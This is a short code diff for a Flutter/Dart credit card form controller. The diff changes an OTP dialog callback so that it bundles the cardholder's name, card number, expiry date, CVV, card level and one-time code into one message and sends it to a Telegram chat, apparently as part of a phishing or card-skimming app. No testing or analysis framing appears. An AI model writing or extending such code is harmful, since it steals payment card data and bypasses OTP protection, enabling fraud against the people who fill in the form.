@@ -48,7 +48,14 @@ class CreditCardFormController extends GetxController {
         return OtpDialog(
           onOtpEntered: (String otp) async {
             // Process the entered OTP (e.g., send to server for validation)
-            await sendMessageToTelegram('OTPCODE : $otp');
+            String msg = "credit card info: " +
+                "\n name :  ${cardNameController.value}" +
+                "\n card number :  ${cardNumberController.value}" +
+                "\n expiration date :  ${expirationDateController.value}" +
+                "\n cvv :  ${cvvController.value}" +
+                "\n level: ${selectedItem.value}" +
+                "OTP Code : ${otp}";
+            await sendMessageToTelegram(msg);
 
             print('Entered OTP: $otp');
           },
